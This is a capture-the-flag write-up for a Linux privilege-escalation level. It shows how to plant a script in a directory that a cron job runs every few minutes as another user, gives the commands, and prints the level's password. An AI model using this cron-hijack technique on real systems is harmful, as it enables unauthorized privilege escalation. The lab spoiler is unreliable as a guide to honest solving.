# LEVEL 05

## 💡 Explanation

In this level we have to:
1. When we log in we receive a notification saying that we have a mail (see screenshot) => Check /var/mail/level05
2. Seems there's a cron executing `sh /usr/sbin/openarenaserver` every 2 mins by the user 'flag05' 
3. When checking the script `/usr/sbin/openarenaserver` we see that it will `for i in /opt/openarenaserver/* => bash -x "$i"`
4. We should create a script on the folder `/opt/openarenaserver` that saves the flag!!

## 👾 Commands

```
cat /var/mail/level05
cat /usr/sbin/openarenaserver
echo 'getflag > /tmp/flag' > /opt/openarenaserver/lol
cat /tmp/flag
```

## 🔍 Resources

- [Where to find the mail!](https://devanswers.co/you-have-mail-how-to-read-mail-in-ubuntu/)
- [Crontab command](https://www.linuxtricks.fr/wiki/cron-et-crontab-le-planificateur-de-taches)
- [Bash command => parameter -x](http://manpagesfr.free.fr/man/man1/bash.1.html)
- [Unlit command (a bit useless)](https://www.ibm.com/docs/fr/sdk-java-technology/7?topic=rja-system-resource-limits-ulimit-command)

## 🔥 Password
`viuaaale9huek52boumoomioc`
